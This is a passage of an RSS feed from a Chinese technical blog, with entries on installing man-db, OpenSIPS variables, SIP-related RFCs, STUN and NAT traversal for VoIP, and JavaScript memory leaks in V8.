&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo apt-get install man-db
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;使用介绍&#34;&gt;使用介绍&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2022/11/deepin-install-man/2022-11-03-12-00-16.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>核心变量</title>
      <link>https://wdd.js.org/2.4.x-docs/core-vars/</link>
      <pubDate>Mon, 31 Oct 2022 14:41:43 +0800</pubDate>
      <guid>https://wdd.js.org/2.4.x-docs/core-vars/</guid>
      <description>&lt;h1 id=&#34;脚本变量&#34;&gt;脚本变量&lt;/h1&gt;
&lt;h1 id=&#34;avp-变量&#34;&gt;avp 变量&lt;/h1&gt;
&lt;h1 id=&#34;伪变量&#34;&gt;伪变量&lt;/h1&gt;
&lt;h2 id=&#34;sip-头-hrdname&#34;&gt;SIP 头, $(hrd(name))&lt;/h2&gt;
&lt;p&gt;$(hdr(name)[N]) - represents the body of the N-th header identified by &amp;rsquo;name&amp;rsquo;. If [N] is omitted then the body of the first header is printed. The first header is got when N=0, for the second N=1, a.s.o. To print the last header of that type, use -1, no other negative values are supported now. No white spaces are allowed inside the specifier (before }, before or after {, [, ] symbols). When N=&amp;rsquo;*&amp;rsquo;, all headers of that type are printed.&lt;/p&gt;</description>
    </item>
    <item>
      <title>SIP相关RFC协议</title>
      <link>https://wdd.js.org/opensips/ch1/sip-rfcs/</link>
      <pubDate>Sun, 30 Oct 2022 21:11:16 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch1/sip-rfcs/</guid>
      <description>&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;RFC&lt;/th&gt;
          &lt;th&gt;名称&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;a href=&#34;https://tools.ietf.org/html/rfc3261&#34;&gt;https://tools.ietf.org/html/rfc3261&lt;/a&gt;&lt;/td&gt;
          &lt;td&gt;SIP: Session Initiation Protocol&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;a href=&#34;https://tools.ietf.org/html/rfc3665&#34;&gt;https://tools.ietf.org/html/rfc3665&lt;/a&gt;&lt;/td&gt;
          &lt;td&gt;Session Initiation Protocol (SIP) Basic Call Flow Examples&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;a href=&#34;https://tools.ietf.org/html/rfc6141&#34;&gt;https://tools.ietf.org/html/rfc6141&lt;/a&gt;&lt;/td&gt;
          &lt;td&gt;Re-INVITE and Target-Refresh Request Handling in the Session Initiation Protocol (SIP)&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;a href=&#34;https://tools.ietf.org/html/rfc4566&#34;&gt;https://tools.ietf.org/html/rfc4566&lt;/a&gt;&lt;/td&gt;
          &lt;td&gt;SDP: Session Description Protocol&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;a href=&#34;https://tools.ietf.org/html/rfc4028&#34;&gt;https://tools.ietf.org/html/rfc4028&lt;/a&gt;&lt;/td&gt;
          &lt;td&gt;Session Timers in the Session Initiation Protocol (SIP)&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;a href=&#34;https://tools.ietf.org/html/rfc1889&#34;&gt;https://tools.ietf.org/html/rfc1889&lt;/a&gt;&lt;/td&gt;
          &lt;td&gt;RTP: A Transport Protocol for Real-Time Applications&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;a href=&#34;https://tools.ietf.org/html/rfc2326&#34;&gt;https://tools.ietf.org/html/rfc2326&lt;/a&gt;&lt;/td&gt;
          &lt;td&gt;Real Time Streaming Protocol (RTSP)&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;a href=&#34;https://tools.ietf.org/html/rfc2327&#34;&gt;https://tools.ietf.org/html/rfc2327&lt;/a&gt;&lt;/td&gt;
          &lt;td&gt;SDP: Session Description Protocol&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;a href=&#34;https://tools.ietf.org/html/rfc3015&#34;&gt;https://tools.ietf.org/html/rfc3015&lt;/a&gt;&lt;/td&gt;
          &lt;td&gt;Megaco Protocol Version 1.0&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;a href=&#34;https://tools.ietf.org/html/rfc1918&#34;&gt;https://tools.ietf.org/html/rfc1918&lt;/a&gt;&lt;/td&gt;
          &lt;td&gt;Address Allocation for Private Internets&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;a href=&#34;https://tools.ietf.org/html/rfc2663&#34;&gt;https://tools.ietf.org/html/rfc2663&lt;/a&gt;&lt;/td&gt;
          &lt;td&gt;IP Network Address Translator (NAT) Terminology and Considerations&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;a href=&#34;https://tools.ietf.org/html/rfc3605&#34;&gt;https://tools.ietf.org/html/rfc3605&lt;/a&gt;&lt;/td&gt;
          &lt;td&gt;Real Time Control Protocol (RTCP) attribute in Session Description Protocol (SDP)&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;a href=&#34;https://tools.ietf.org/html/rfc3711&#34;&gt;https://tools.ietf.org/html/rfc3711&lt;/a&gt;&lt;/td&gt;
          &lt;td&gt;The Secure Real-time Transport Protocol (SRTP)&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;a href=&#34;https://tools.ietf.org/html/rfc4568&#34;&gt;https://tools.ietf.org/html/rfc4568&lt;/a&gt;&lt;/td&gt;
          &lt;td&gt;Session Description Protocol (SDP) Security Descriptions for Media Streams&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;a href=&#34;https://tools.ietf.org/html/rfc4585&#34;&gt;https://tools.ietf.org/html/rfc4585&lt;/a&gt;&lt;/td&gt;
          &lt;td&gt;Extended RTP Profile for Real-time Transport Control Protocol (RTCP)-Based Feedback (RTP/AVPF)&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;a href=&#34;https://tools.ietf.org/html/rfc5124&#34;&gt;https://tools.ietf.org/html/rfc5124&lt;/a&gt;&lt;/td&gt;
          &lt;td&gt;Extended Secure RTP Profile for Real-time Transport Control Protocol (RTCP)-Based Feedback (RTP/SAVPF)&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;a href=&#34;https://tools.ietf.org/html/rfc5245&#34;&gt;https://tools.ietf.org/html/rfc5245&lt;/a&gt;&lt;/td&gt;
          &lt;td&gt;Interactive Connectivity Establishment (ICE): A Protocol for Network Address Translator (NAT) Traversal for Offer/Answer Protocols&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;a href=&#34;https://tools.ietf.org/html/rfc5626&#34;&gt;https://tools.ietf.org/html/rfc5626&lt;/a&gt;&lt;/td&gt;
          &lt;td&gt;Managing Client-Initiated Connections in the Session Initiation Protocol (SIP)&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;a href=&#34;https://tools.ietf.org/html/rfc5761&#34;&gt;https://tools.ietf.org/html/rfc5761&lt;/a&gt;&lt;/td&gt;
          &lt;td&gt;Multiplexing RTP Data and Control Packets on a Single Port&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;a href=&#34;https://tools.ietf.org/html/rfc5764&#34;&gt;https://tools.ietf.org/html/rfc5764&lt;/a&gt;&lt;/td&gt;
          &lt;td&gt;Datagram Transport Layer Security (DTLS) Extension to Establish Keys for the Secure Real-time Transport Protocol (SRTP)&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;</description>
    </item>
    <item>
      <title>STUN协议笔记</title>
      <link>https://wdd.js.org/opensips/ch1/stun-notes/</link>
      <pubDate>Sun, 30 Oct 2022 20:22:09 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch1/stun-notes/</guid>
      <description>&lt;hr&gt;
&lt;h2 id=&#34;draft-false&#34;&gt;title: &amp;ldquo;STUN协议笔记&amp;rdquo;
date: &amp;ldquo;2022-01-06 17:54:10&amp;rdquo;
draft: false&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;STUN是&lt;strong&gt;S&lt;/strong&gt;imple &lt;strong&gt;T&lt;/strong&gt;raversal of &lt;strong&gt;U&lt;/strong&gt;ser Datagram Protocol (UDP) through &lt;strong&gt;N&lt;/strong&gt;etwork Address Translators (NAT’s)的缩写&lt;/li&gt;
&lt;li&gt;传输层底层用的是UDP&lt;/li&gt;
&lt;li&gt;主要用来NAT穿透&lt;/li&gt;
&lt;li&gt;主要用来解决voip领域的单方向通话(one-way)的问题&lt;/li&gt;
&lt;li&gt;目的是让NAT后面的设备能发现自己的公网IP以及NAT的类型&lt;/li&gt;
&lt;li&gt;让外部设备能够找到合适的端口和内部设备通信&lt;/li&gt;
&lt;li&gt;刷新NAT绑定，类似keep-alive机制。否则端口映射可能因为超时被释放&lt;/li&gt;
&lt;li&gt;STUN是cs架构的协议&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch1/stun-notes/2022-10-30-20-23-53.png&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;ol&gt;
&lt;li&gt;客户端端192.168.1.3，使用5060端口，发送stun请求到 64.25.58.65， 经过了192.168.1.1的网关之后&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;网关将源ip改为212.128.56.125， 端口改为15050&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;stun服务器将请求发送到 网关的外网端口15050，然后网关将请求转发给192.168.1.3:5060&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;stun message type which typically is one of the below:
- 0x0001 : Binding Request
- 0x0101 : Binding Response&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;0x0111 : Binding Error Response&lt;/li&gt;
&lt;li&gt;0x0002 : Shared Secret Request&lt;/li&gt;
&lt;li&gt;0x0102 : Shared Secret Response&lt;/li&gt;
&lt;li&gt;0x0112 : Shared Secret Error Response&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;**0x0001: MAPPED-ADDRESS - **This attribute contains an IP address and port. It is always placed in the Binding Response, and it indicates the source IP address and port the server saw in the Binding Request sent from the client, i.e.; the STUN client’s public IP address and port where it can be reached from the internet.&lt;/p&gt;</description>
    </item>
    <item>
      <title>SIP信令和媒体都绕不开的NAT问题</title>
      <link>https://wdd.js.org/opensips/ch1/nat-sip-rtp/</link>
      <pubDate>Sun, 30 Oct 2022 19:37:02 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch1/nat-sip-rtp/</guid>
      <description>&lt;h1 id=&#34;什么是nat&#34;&gt;什么是NAT?&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch1/nat-sip-rtp/2022-10-30-20-18-07.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;NAT(网络地址转换)， 具体可以参考百科 &lt;a href=&#34;https://baike.baidu.com/item/nat/320024&#34;&gt;https://baike.baidu.com/item/nat/320024&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;NAT是用来解决IPv4的地址不够的问题。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch1/nat-sip-rtp/2022-10-30-19-42-21.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;例如上图，内网的主机，在访问外网时，源192.168的网址，会被改写成1.2.3.4。所以在server端看来，请求是从1.2.3.4发送过来的。&lt;/p&gt;
&lt;p&gt;NAT一般会改写请求的源IP包的源IP地址，也可能会改写tcp或者udp的源端口地址。&lt;/p&gt;
&lt;h1 id=&#34;nat地址范围&#34;&gt;NAT地址范围&lt;/h1&gt;
&lt;p&gt;互联网地址分配机构保留了三类网址只能由于私有地址，这些地址只能由于NAT内部，不能用于公网。&lt;/p&gt;
&lt;p&gt;如果在sip消息中，Contact头中的地址是192.168开头，聪明的服务器应该知道，这个请求来自NAT内部。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;10.0.0.0        -   10.255.255.255  &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;10/8 prefix&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;172.16.0.0      -   172.31.255.255  &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;172.16/12 prefix&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;192.168.0.0     -   192.168.255.255 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;192.168/16 prefix&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;nat-工作原理&#34;&gt;NAT 工作原理&lt;/h1&gt;
&lt;p&gt;NAT内部流量流出时，源IP和源端口都被改写，目标地址和端口不会改写。源ip和端口与被改写后的ip和端口存在一段时间的映射关系，当响应回来时，根据这个映射关系，NAT设备知道这个包应该发给内网的哪个设备。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch1/nat-sip-rtp/2022-10-30-20-19-41.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;nat分类&#34;&gt;NAT分类&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;静态NAT: 每个内部主机都&lt;strong&gt;永久映射&lt;/strong&gt;一个外部公网IP&lt;/li&gt;
&lt;li&gt;动态NAT: 每个内部主机都&lt;strong&gt;动态映射&lt;/strong&gt;一个外部公网IP&lt;/li&gt;
&lt;li&gt;网络地址端口转换: 内部主机映射到外部&lt;strong&gt;不同端口&lt;/strong&gt;上&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;由于静态NAT和动态NAT并不能节省公网IP,  常用的都是网络地址端口转换，即NAPT。&lt;/p&gt;
&lt;h1 id=&#34;napt-网络地址端口转换分类&#34;&gt;NAPT 网络地址端口转换分类&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;全锥型NAT &lt;/li&gt;
&lt;li&gt;限制锥型NAT： 限制主机&lt;/li&gt;
&lt;li&gt;端口限制NAT：限制主机和端口&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;full-cone-nat-全锥型nat&#34;&gt;Full Cone NAT 全锥型NAT &lt;/h2&gt;
&lt;p&gt;打洞过程&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;来自nat内部ip1:port1地址在经过路由器时，路由器会打洞ip1&amp;rsquo;:port1&#39;&lt;/li&gt;
&lt;li&gt;任何服务器只要把包发到ip1&amp;rsquo;:port1&amp;rsquo;，路由器都会把这个包发到ip1:port1。也就是说，即使刚开始打洞的包是发给server1的，如果server2知道这个洞的信息，那么server2也可以通过这洞，将消息发给ip1:port1&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch1/nat-sip-rtp/2022-10-30-20-01-04.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;restricted-cone-nat-限制锥型nat&#34;&gt;Restricted Cone NAT 限制锥型NAT&lt;/h2&gt;
&lt;p&gt;限制锥型打洞过程和全锥型差不多，只不过增加了限制。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;如果内部主机是把包发到server1的，即使server2知道打洞的信息，它发的包也不会被转给内部主机。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch1/nat-sip-rtp/2022-10-30-20-16-52.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;port-restricted-cone-nat-端口限制nat&#34;&gt;Port Restricted Cone NAT 端口限制NAT&lt;/h2&gt;
&lt;p&gt;端口限制NAT要比上述两种NAT的限制更为严格&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;内部主机如果将消息发到server1的5080端口，那么这个端口只允许server1的5080端口发消息回来&lt;/li&gt;
&lt;li&gt;server1的其他端口发消息到这个洞都会被拒绝&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch1/nat-sip-rtp/2022-10-30-20-17-10.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;sip信令nat穿越&#34;&gt;SIP信令NAT穿越&lt;/h1&gt;
&lt;p&gt;NAT内部消息发到fs时，会携带如下信息。假如fs对NAT一无所知，如果后续有呼叫，fs是无法将消息发到192.168.0.102的，因为192.168.0.102是内网地址。&lt;/p&gt;
&lt;p&gt;但是fs足够聪明，它会从分析包的源ip和源端口，从而正确的将sip消息送到NAT设备上。&lt;/p&gt;</description>
    </item>
    <item>
      <title>JavaScript内存泄露分析</title>
      <link>https://wdd.js.org/fe/memory-leak-ppt/</link>
      <pubDate>Sat, 29 Oct 2022 11:52:59 +0800</pubDate>
      <guid>https://wdd.js.org/fe/memory-leak-ppt/</guid>
      <description>&lt;p&gt;参考: &lt;a href=&#34;http://slides.com/gruizdevilla/memory#/7/11&#34;&gt;http://slides.com/gruizdevilla/memory&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;heading&#34;&gt;&lt;/h1&gt;
&lt;h1 id=&#34;内存是一张图&#34;&gt;内存是一张图&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;原始类型，只能作为叶子。原始类型不能引用其他类型
&lt;ul&gt;
&lt;li&gt;数字&lt;/li&gt;
&lt;li&gt;字符串&lt;/li&gt;
&lt;li&gt;布尔值&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;除了原始类型之外，其他类型都是对象，其实就是键值对&lt;/li&gt;
&lt;li&gt;数组是一种特殊对象，它的键是连续的数字&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/fe/memory-leak-ppt/2022-10-29-11-53-40.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;内存从根开始&#34;&gt;内存从根开始&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;在浏览器中，根对象是window&lt;/li&gt;
&lt;li&gt;在nodejs中，根对象是global&lt;/li&gt;
&lt;li&gt;任何从根无法到达的对象，都会被GC回收，例如下图的节点9和10&lt;/li&gt;
&lt;li&gt;根节点的GC是无法控制的&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/fe/memory-leak-ppt/2022-10-29-11-53-49.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;路径&#34;&gt;路径&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;从根节点开始到特定对象的路径，如下图的1-2-4-6-8&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/fe/memory-leak-ppt/2022-10-29-11-53-57.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;支配项&#34;&gt;支配项&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;每个对象有且仅有一个支配项，支配项对对象可能不是直接引用&lt;/li&gt;
&lt;li&gt;举例子
&lt;ul&gt;
&lt;li&gt;节点1支配节点2&lt;/li&gt;
&lt;li&gt;节点2支持节点3、4、6&lt;/li&gt;
&lt;li&gt;节点3支配节点5&lt;/li&gt;
&lt;li&gt;节点6支配节点7&lt;/li&gt;
&lt;li&gt;节点5支配节点8&lt;/li&gt;
&lt;li&gt;上面的例子有个不好理解的是节点2为什么支配了节点6？如果节点A存在于&lt;strong&gt;从根节点到节点B的每一个路径&lt;/strong&gt;中，那么A就是B的支配项。2存在于1-2-4-6，也存在于1-2-3-6，所以节点2支配节点6&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/fe/memory-leak-ppt/2022-10-29-11-54-06.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;v8-新生代与老生代&#34;&gt;V8 新生代与老生代&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;v8内存分为新生代和老生代内存，两块内存使用不同的内存GC策略&lt;/li&gt;
&lt;li&gt;相比而言，新生代GC很快，老生代则较慢&lt;/li&gt;
&lt;li&gt;新生代的内存在某些条件下会被转到老生代内存区&lt;/li&gt;
&lt;li&gt;GC发生时，用可能应用会暂停&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;解除引用的一些错误&#34;&gt;解除引用的一些错误&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;var a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;name: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;wdd&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;delete a.name // 这回让对象a变成慢对象
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;var a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;name: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;wdd&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a.name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; null // 这个则更好
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;关于slow-object&#34;&gt;关于slow Object&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;V8 optimizing compiler makes assumptions on your code to make optimizations.&lt;/li&gt;
&lt;li&gt;It transparently creates hidden classes that represent your objects.&lt;/li&gt;
&lt;li&gt;Using this hidden classes, V8 works much faster. If you &amp;ldquo;delete&amp;rdquo; properties, these assumptions are no longer valid, and the code is de-optimized, slowing your code.&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;// Fast Object 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; FastPurchase&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;units, price&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    this.units &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; units;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    this.price &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; price;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    this.total &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    this.x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 1;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;var fast &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; new FastPurchase&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;3, 25&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;// Slow Object 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; SlowPurchase&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;units, price&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    this.units &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; units;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    this.price &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; price;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    this.total &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    this.x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 1;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;var slow &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; new SlowPurchase&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;3, 25&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;//x property is useless 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;//so I delete it
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;delete slow.x; 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/fe/memory-leak-ppt/2022-10-29-11-54-19.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>JS内存泄漏分享</title>
      <link>https://wdd.js.org/fe/memory-leak-sharing/</link>
      <pubDate>Sat, 29 Oct 2022 11:47:38 +0800</pubDate>
      <guid>https://wdd.js.org/fe/memory-leak-sharing/</guid>
      <description>&lt;h1 id=&#34;什么是内存泄漏&#34;&gt;什么是内存泄漏？&lt;/h1&gt;
